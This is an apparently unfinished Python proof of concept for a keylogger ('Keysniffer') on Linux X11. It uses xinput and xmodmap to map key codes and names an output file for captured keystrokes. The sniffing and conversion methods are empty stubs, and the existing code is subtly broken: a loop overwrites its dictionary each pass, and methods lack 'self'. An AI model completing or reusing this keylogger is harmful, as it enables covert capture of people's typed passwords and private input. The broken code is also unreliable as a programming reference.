### Trivial Keysniffing PoC
import subprocess
import os
import re

class Keysniffer():
        # Dictionary to hold keycode mapping
        KEYCODES = dict()
        def __init__(self, xinput_bin='/usr/bin/xinput', keymap=KEYCODES,\
                        outfile='rekt.txt'):
               self.xinput = xinput_bin
               self.keycodes = keymap
               self.outfile = outfile
                
        def GetKeyCodes(self):
                # Call xmodmap to get keycode mapping, pipe to stdout
                modmap_out = subprocess.Popen(
                        ('xmodmap', '-pm', '-pk'), stdout=subprocess.PIPE)
                
                # Call cut on xmodmap output to get codes column
                cut_c1 = subprocess.check_output(
                        ('cut', '-sf', '1'), stdin=modmap_out.stdout)

                for line in cut_c1:
                        self.keycodes = {str(line): ''}
                print(self.keycodes)
                

        def CodeConverter():
                pass

        def Sniff():
                pass
        